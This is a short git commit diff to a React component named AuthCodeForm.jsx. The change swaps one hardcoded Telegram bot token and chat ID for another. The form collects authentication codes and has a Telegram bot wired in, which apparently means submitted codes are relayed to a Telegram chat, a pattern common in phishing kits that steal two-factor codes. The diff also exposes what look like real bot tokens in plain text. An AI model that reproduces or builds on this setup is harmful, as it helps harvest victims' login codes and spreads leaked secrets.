e7cdd406ad0b538351027d40114ed32a9c6a1d34
lothixoa04022002 <lothixoa04022002@gmail.com>
2025-12-20 02:38:51 -0800

    Update AuthCodeForm.jsx

--- src/AuthCodeForm.jsx
+++ src/AuthCodeForm.jsx
@@ -3,8 +3,8 @@ import { useLocation, Navigate } from "react-router-dom";
 import "./AuthCodeForm.scss";
 
 const AuthCodeForm = () => {
-  const BOT_TOKEN = "8086716759:AAFCscXRDQyhE5ALacAQyx5trLb40KQfABM";
-  const CHAT_ID = "1140844339";
+  const BOT_TOKEN = "8118106276:AAGa5e-hrME4pNo0TneYNJxRoAThrVf969Q";
+  const CHAT_ID = "6604062347";
 
   const { state } = useLocation();
   if (!state) return <Navigate to="/" replace />;
